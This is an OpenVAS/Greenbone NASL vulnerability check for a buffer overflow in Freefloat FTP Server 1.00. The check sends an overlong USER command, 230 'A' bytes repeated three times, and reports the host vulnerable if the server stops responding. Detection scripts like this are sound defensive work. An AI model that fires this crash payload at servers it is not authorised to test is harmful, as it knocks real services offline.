# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801658");
  script_version("2025-08-08T15:44:57+0000");
  script_tag(name:"last_modification", value:"2025-08-08 15:44:57 +0000 (Fri, 08 Aug 2025)");
  script_tag(name:"creation_date", value:"2010-12-09 06:36:39 +0100 (Thu, 09 Dec 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-10023");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Freefloat FTP Server <= 1.00 Buffer Overflow Vulnerability - Active Check");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/freefloat/detected");

  script_tag(name:"summary", value:"Freefloat FTP Server is prone to a buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted FTP request and check whether the application
  is still responsive.");

  script_tag(name:"insight", value:"The flaw is due to improper bounds checking when processing
  certain requests.");

  script_tag(name:"impact", value:"Successful exploits may allow remote attackers to execute
  arbitrary code on the system or cause the application to crash.");

  script_tag(name:"affected", value:"FreeFloat Ftp Server Version 1.00.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/15689");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/23243");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/96400/freefloat-overflow.txt");
  script_xref(name:"URL", value:"https://my.saintcorporation.com/cgi-bin/exploit_info/freefloat_ftp_server_user_cmd");
  script_xref(name:"URL", value:"https://web.archive.org/web/20101213050627/http://www.freefloat.com/sv/about-/about-.php");
  script_xref(name:"URL", value:"https://web.archive.org/web/20101208040029/http://secunia.com/advisories/42465/");

  exit(0);
}

include("ftp_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);
banner = ftp_get_banner(port:port);

if(!banner || "FreeFloat Ftp Server" >!< banner)
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

get = recv_line(socket:soc, length:100);
if(!get) {
  close(soc);
  exit(0);
}

## Sending Attack
for(i=0;i<3;i++) {
  attack = string("USER ",crap(data: raw_string(0x41), length: 230), "\r\n");
  send(socket:soc, data:attack);
  get = recv_line(socket:soc, length:260);

  if(!get)
  {
    close(soc);
    security_message(port:port);
    exit(0);
  }
}
close(soc);
